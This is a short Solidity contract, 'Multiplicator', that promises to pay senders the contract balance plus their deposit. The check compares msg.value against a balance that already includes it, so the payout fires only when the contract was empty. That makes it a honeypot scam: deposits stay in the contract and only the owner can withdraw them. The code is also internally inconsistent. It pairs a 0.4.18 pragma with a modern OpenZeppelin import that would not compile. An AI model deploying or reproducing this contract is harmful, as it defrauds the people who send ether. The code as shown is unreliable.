pragma solidity ^0.4.18;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract Multiplicator
 is ReentrancyGuard {
    address public Owner = msg.sender;

    function()payable{}

    function withdraw()
    payable
    public
    nonReentrant {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    nonReentrant {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}